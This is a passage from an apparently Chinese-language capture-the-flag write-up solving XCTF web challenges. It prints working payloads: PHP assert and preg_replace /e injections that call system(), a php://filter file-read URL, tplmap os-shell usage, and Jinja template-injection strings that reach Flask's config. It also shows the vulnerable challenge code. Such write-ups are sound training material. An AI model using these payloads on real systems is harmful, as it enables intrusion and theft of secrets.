<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assertÂáΩÊï∞‰ºöÊääËØªËøõÊù•ÁöÑ‰ª£Á†ÅÂΩì‰ΩúphpÊâßË°åÔºåstrpos ‚Äî Êü•ÊâæÂ≠óÁ¨¶‰∏≤È¶ñÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆ
</span></span><span class="line"><span class="cl">ÂÖàÊäästrposÈó≠Âêà,&#39;)Áî®.Êù•ÊãºÊé•ËØ≠Âè•ÔºåÁî®//Êää&#39;..&#39;) === false&#34;) or die(&#34;Detected hacking attempt!&#34;);Ê≥®Èáä
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119113704068.png"
	width="1881"
	height="824"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119113704068_hu18166407736922564807.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119113704068_hu11328242402843689726.png 1024w"
	loading="lazy"
	
		alt="image-20250119113704068"
	
	
		class="gallery-image" 
		data-flex-grow="228"
		data-flex-basis="547px"
	
></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Âõ†‰∏∫Áü•ÈÅìflagÂú®templatesÊñá‰ª∂Â§π‰∏ãÈù¢
</span></span><span class="line"><span class="cl">?page=&#39;).system(&#34;cat templates/flag.php&#34;);//
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•ÁúãÊ∫êÁ†ÅÂæóÂà∞flag</p>
<h2 id="ics-05">ics-05
</h2><p>Êü•ÁúãÊ∫êÁ†ÅÂèëÁé∞Êúâ?page=index</p>
<p>ÁåúÊµãÊòØÊñá‰ª∂ÂåÖÂê´</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119130543205.png"
	width="1571"
	height="935"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119130543205_hu5192714493201707958.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119130543205_hu6508868839321829571.png 1024w"
	loading="lazy"
	
		alt="image-20250119130543205"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="403px"
	
></p>
<p>Áî®‰º™ÂçèËÆÆËØªindex.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://61.147.171.105:65276/index.php?page=php://filter/read=convert.base64-encode/resource=index.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">page</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">ctype_alnum</span><span class="p">(</span><span class="nv">$page</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;div style=&#34;text-align:center&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;p class=&#34;lead&#34;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">}else{
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;div style=&#34;text-align:center&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">            &lt;p class=&#34;lead&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">                &lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if (strpos($page, &#39;input&#39;) &gt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if (strpos($page, &#39;ta:text&#39;) &gt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if (strpos($page, &#39;text&#39;) &gt; 0) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">                if ($page === &#39;index.php&#39;) {
</span></span></span><span class="line"><span class="cl"><span class="err">                    die(&#39;Ok&#39;);
</span></span></span><span class="line"><span class="cl"><span class="err">                }
</span></span></span><span class="line"><span class="cl"><span class="err">                    include($page);
</span></span></span><span class="line"><span class="cl"><span class="err">                    die();
</span></span></span><span class="line"><span class="cl"><span class="err">                ?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">}}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">//Êñπ‰æøÁöÑÂÆûÁé∞ËæìÂÖ•ËæìÂá∫ÁöÑÂäüËÉΩ,Ê≠£Âú®ÂºÄÂèë‰∏≠ÁöÑÂäüËÉΩÔºåÂè™ËÉΩÂÜÖÈÉ®‰∫∫ÂëòÊµãËØï
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">if ($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;) {
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    echo &#34;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    $pattern = $_GET[pat];
</span></span></span><span class="line"><span class="cl"><span class="err">    $replacement = $_GET[rep];
</span></span></span><span class="line"><span class="cl"><span class="err">    $subject = $_GET[sub];
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
</span></span></span><span class="line"><span class="cl"><span class="err">        preg_replace($pattern, $replacement, $subject);
</span></span></span><span class="line"><span class="cl"><span class="err">    }else{
</span></span></span><span class="line"><span class="cl"><span class="err">        die();
</span></span></span><span class="line"><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctype_alnum($text)ÂáΩÊï∞‰ºöÂåπÈÖç‰º†ÂÖ•ÂèÇÊï∞‰∏≠ÊòØÂê¶ÂÖ®‰∏∫Êï∞Â≠óÊàñËÄÖÂ≠óÊØçÔºåÂ¶ÇÊûúÊòØËøîÂõûtrueÔºåÂê¶ÂàôËøîÂõûfalse„ÄÇ
</span></span><span class="line"><span class="cl">strpos(string,find,start) ÂáΩÊï∞Êü•ÊâæfindÂú®Âè¶‰∏ÄÂ≠óÁ¨¶‰∏≤string‰∏≠Á¨¨‰∏ÄÊ¨°Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºàÂ§ßÂ∞èÂÜôÊïèÊÑüÔºâ„ÄÇ
</span></span><span class="line"><span class="cl">preg_replace($pattern, $replacement, $subject)ÂáΩÊï∞‰ºöÂ∞Üsubject‰∏≠ÂåπÈÖçpatternÁöÑÈÉ®ÂàÜÁî®replacementÊõøÊç¢ÔºåÂ¶ÇÊûúÂêØÁî®/eÂèÇÊï∞ÁöÑËØùÔºåÂ∞±‰ºöÂ∞ÜreplacementÂΩìÂÅöphp‰ª£Á†ÅÊâßË°å„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êé•‰∏ãÊù•Â∞±ÊòØÊäìÂåÖÊääX-Forwarded-For:127.0.0.1,ÁÑ∂ÂêéÂà©Áî®preg/eÊºèÊ¥û</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119133713268.png"
	width="1570"
	height="785"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119133713268_hu15742616837383222431.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119133713268_hu27780829575703322.png 1024w"
	loading="lazy"
	
		alt="image-20250119133713268"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="480px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?pat=/1/e&amp;rep=system(&#34;ls&#34;)&amp;sub=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119135923227.png"
	width="1478"
	height="713"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119135923227_hu17159282961983644091.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119135923227_hu13629701493100885064.png 1024w"
	loading="lazy"
	
		alt="image-20250119135923227"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="497px"
	
></p>
<p>Âõ†‰∏∫‰∏äÈù¢ctype_alnumÂáΩÊï∞ËßÑÂÆöÂè™ËÉΩÊòØÊï∞Â≠óÂíåÂ≠óÊØçÔºåÊâÄ‰ª•Ë¶ÅÁî®urlÁºñÁ†Å</p>
<p>;Áî®%3bÊàñËÄÖ‰∏§‰∏™&amp;&amp;Áî®%26%26</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?pat=/1/e&amp;rep=system(&#34;cd%20s3chahahaDir%3bls&#34;)&amp;sub=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140359168.png"
	width="1547"
	height="805"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140359168_hu4406484529133645255.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119140359168_hu17822031115820913198.png 1024w"
	loading="lazy"
	
		alt="image-20250119140359168"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?pat=/1/e&amp;rep=system(&#34;cd%20s3chahahaDir/flag%3bcat%20flag.php&#34;)&amp;sub=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140509847.png"
	width="1575"
	height="817"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119140509847_hu18006935736999393254.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119140509847_hu8182454460828114968.png 1024w"
	loading="lazy"
	
		alt="image-20250119140509847"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="462px"
	
></p>
<h2 id="easytornado">easytornado
</h2><p>È¢òÁõÆÊèêÁ§∫flagÂú®/fllllllllllllag</p>
<p>ÁÑ∂Âêéhint.txt‰∏≠ËØ¥‰º†ÂèÇÊñπÂºèÊòØmd5(secret_cookie+md5(Êñá‰ª∂Âêç))</p>
<p>Êàë‰ª¨Ë¶ÅÊãøÂà∞secret_cookieÂ∞±ËÉΩËß£ÂÜ≥</p>
<p>È¢òÁõÆÂêçÂ≠óÊòØtornadoÊ°ÜÊû∂</p>
<p>Êàë‰ª¨‰∏çÊúçÊù°‰ª∂‰º†ÂèÇ</p>
<p>Âá∫Áé∞error</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141408302.png"
	width="1248"
	height="696"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141408302_hu12500444631557321478.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119141408302_hu7290029422396411453.png 1024w"
	loading="lazy"
	
		alt="image-20250119141408302"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<p>‚Äã	ÁÑ∂ÂêéÁªôerrorÁöÑmsg‰º†ÂÄº</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141445713.png"
	width="1503"
	height="800"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119141445713_hu4970935745476587387.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119141445713_hu8189329653289637027.png 1024w"
	loading="lazy"
	
		alt="image-20250119141445713"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="450px"
	
></p>
<p>Ê£ÄÊµãÊúâÊ≤°ÊúâsstiÊºèÊ¥û</p>
<p>ÂêØÂä®tplmap</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python tplmap.py -u &#34;ip&#34;
</span></span><span class="line"><span class="cl">Â¶ÇÊûúÊúâÁî®‰ºöÂõûÊòæÊ®°ÊùøËÄå‰∏îÂèØ‰ª•Áõ¥Êé•--engine xx --os-shell
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈ¢òÊ≤°Êúâ</p>
<p>Âú®TornadoÈáåÔºåÂ∫îÁî®ÁöÑËÆæÁΩÆÂèØ‰ª•ÈÄöËøáhandler.settingsËÆøÈóÆ„ÄÇ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144331589.png"
	width="1796"
	height="715"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144331589_hu8046016296789855936.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119144331589_hu16492694008952527173.png 1024w"
	loading="lazy"
	
		alt="image-20250119144331589"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="602px"
	
></p>
<p>ÊãøÂà∞secret_cookie</p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØmd5Âä†ÂØÜÂæóÂà∞flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3762f300-baaf-466d-b133-c787da072acf3bf9f6cf685a6dd8defadabfb41a03a1
</span></span><span class="line"><span class="cl">420186c23b1519d4196940a9bfe11348
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144656994.png"
	width="1443"
	height="679"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119144656994_hu2529771689696394332.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119144656994_hu1337245768045527773.png 1024w"
	loading="lazy"
	
		alt="image-20250119144656994"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="510px"
	
></p>
<h2 id="shrine">shrine
</h2><p>‰∏äÊù•ÁªôÊ∫êÁ†ÅÔºåÂèëÁé∞flaskÊ°ÜÊû∂ÔºåÊÉ≥Âà∞SSTIÊ®°ÊùøÊ≥®ÂÖ•</p>
<p>Ê∫êÁ†ÅÈáåÈù¢Êúâ/shrine/</p>
<p>ÊãºÊé•ÊµãËØï‰∏Ä‰∏ã</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250119152936908.png"
	width="1270"
	height="666"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250119152936908_hu4366008145850413104.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250119152936908_hu16383468626943631136.png 1024w"
	loading="lazy"
	
		alt="image-20250119152936908"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="457px"
	
></p>
<p>Á°ÆÂÆûÂ≠òÂú®</p>
<p>‰ΩÜÊòØÂ∑•ÂÖ∑‰∏ÄÊääÊ¢≠‰∏çÂá∫Êù•</p>
<p>ÂõûÂà∞Ê∫êÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/shrine/&lt;path:shrine&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shrine</span><span class="p">(</span><span class="n">shrine</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">safe_jinja</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;config&#39;</span><span class="p">,</span> <span class="s1">&#39;self&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;{</span><span class="si">% r</span><span class="s1">aw %}{</span><span class="si">%%</span><span class="s1"> set </span><span class="si">%s</span><span class="s1">=None</span><span class="si">%%</span><span class="s1">}{</span><span class="si">% e</span><span class="s1">ndraw %}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">])</span> <span class="o">+</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">safe_jinja</span><span class="p">(</span><span class="n">shrine</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ªñÂ∞ÜconfigÂíåselfÂΩìÊàê‰∫ÜÈªëÂêçÂçï ËÄåflagÂú®configÊñá‰ª∂Èáå
Â¶ÇÊûúÊ≤°ÊúâÈªëÂêçÂçïÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨ÂèØ‰ª•‰º†ÂÖ• configÔºåÊàñËÄÖ‰º†ÂÖ•{{self.<em>dict</em>}}Ëé∑ÂèñÔºå‰ΩÜÂΩìËøô‰∫õË¢´ËøáÊª§ÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨ÈúÄË¶ÅÂÄüÂä©‰∏Ä‰∫õÂÖ®Â±ÄÂèòÈáèÂà©Áî®Ê≤ôÁõíÈÄÉÈÄ∏ÁöÑÊñπÊ≥ïÔºåÊù•Ë∞ÉÁî®Ë¢´Á¶ÅÁî®ÁöÑÂáΩÊï∞ÂØπË±°„ÄÇ</p>
<p>Êàë‰ª¨ËæìÂÖ•ÁöÑÂÄºÈ¶ñÂÖàË¢´‰º†Âà∞‰∫Üsafe_jinjaÂáΩÊï∞ÔºåÁÑ∂ÂêéÁî±flask.render_template_stringËøõË°åÊ∏≤Êüì
‰º†ÂÖ•ÁöÑÔºà ÔºâÈÉΩ‰ºöË¢´ÁΩÆÊç¢‰∏∫Á©∫</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Áî®ÂÖ®Â±ÄÂèòÈáè‰ª£ÁêÜcurrent_appÁªïËøáÔºåÊü•Áúãconfig
</span></span><span class="line"><span class="cl">{{url_for.__globals__[&#39;current_app&#39;].config}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÆòÊñπwp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{get_flashed_messages.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="fakebook">fakebook
</h2><p>ÁõÆÂΩïÊâ´ÊèèÂèëÁé∞flag.phpÂíårobots.txt</p>
<p>Áõ¥Êé•ËÆøÈóÆflag.phpÊ≤°ÁªìÊûúÔºåËÆøÈóÆrobots.txt</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250120104855137.png"
	width="1402"
	height="631"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250120104855137_hu4283240280899446503.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250120104855137_hu14342533120812034036.png 1024w"
	loading="lazy"
	
		alt="image-20250120104855137"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>‰∏ãËΩΩuser.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
